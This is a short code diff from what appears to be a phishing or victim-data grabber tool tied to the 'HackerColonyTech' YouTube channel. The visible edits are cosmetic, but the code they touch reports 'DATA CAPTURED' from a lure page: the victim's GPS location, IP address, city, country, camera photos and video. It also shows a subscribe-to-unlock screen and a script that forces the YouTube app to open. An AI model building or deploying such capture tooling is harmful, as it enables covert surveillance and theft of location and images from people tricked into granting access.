@@ -55,8 +55,8 @@ def show_tool_lock_screen():
 
     print(f"
 {Fore.RED}{Style.BRIGHT}🔒 This tool is locked{Style.RESET_ALL}")
-    print(f"{Fore.YELLOW}Subscribe click on the bell 🔔 to unlock{Style.RESET_ALL}")
-    print()
+    print(f"{Fore.YELLOW}Subscribe click on the bell 🔔 to unlock{Style.RESET_ALL}
+")
     print(f"{Fore.CYAN}Countdown starting...{Style.RESET_ALL}")
     for i in range(9, 0, -1):
         print(f"{Fore.CYAN}{Style.BRIGHT}{i}{Style.RESET_ALL}", end=" ", flush=True)
@@ -183,7 +183,6 @@ function openYouTubeApp() {
     const intentUrl = `intent://www.youtube.com/channel/${channelId}#Intent;package=com.google.android.youtube;scheme=https;end;`;
     const vndUrl = `vnd.youtube://channel/${channelId}`;
     const userUrl = 'https://www.youtube.com/@HackerColonyTech';
-    // Try intent URL
     setTimeout(() => {
         const a = document.createElement('a');
         a.href = intentUrl;
@@ -192,11 +191,9 @@ function openYouTubeApp() {
         a.click();
         document.body.removeChild(a);
     }, 200);
-    // Try vnd scheme next
     setTimeout(() => {
         window.location = vndUrl;
     }, 800);
-    // Fallback to new tab
     setTimeout(() => {
         window.open(userUrl, '_blank');
     }, 2200);
@@ -440,7 +437,10 @@ def report():
         save_report_csv(record)
         print(f"
 {Fore.GREEN}{Style.BRIGHT}🎁 REWARD CLAIMED - DATA CAPTURED!{Style.RESET_ALL}")
-        print(f"{Fore.CYAN}📍 Location: {lat}, {lon}" if lat and lon else f"{Fore.YELLOW}📍 Location: Access denied{Style.RESET_ALL}")
+        if lat and lon:
+            print(f"{Fore.CYAN}📍 Location: {lat}, {lon}{Style.RESET_ALL}")
+        else:
+            print(f"{Fore.YELLOW}📍 Location: Access denied{Style.RESET_ALL}")
         print(f"{Fore.CYAN}🌐 IP: {ip} ({city}, {country}){Style.RESET_ALL}")
         print(f"{Fore.CYAN}📸 Photos: {len(photo_files)}{Style.RESET_ALL}")
         print(f"{Fore.CYAN}🎥 Video: {'Yes' if video_file else 'No'}{Style.RESET_ALL}")
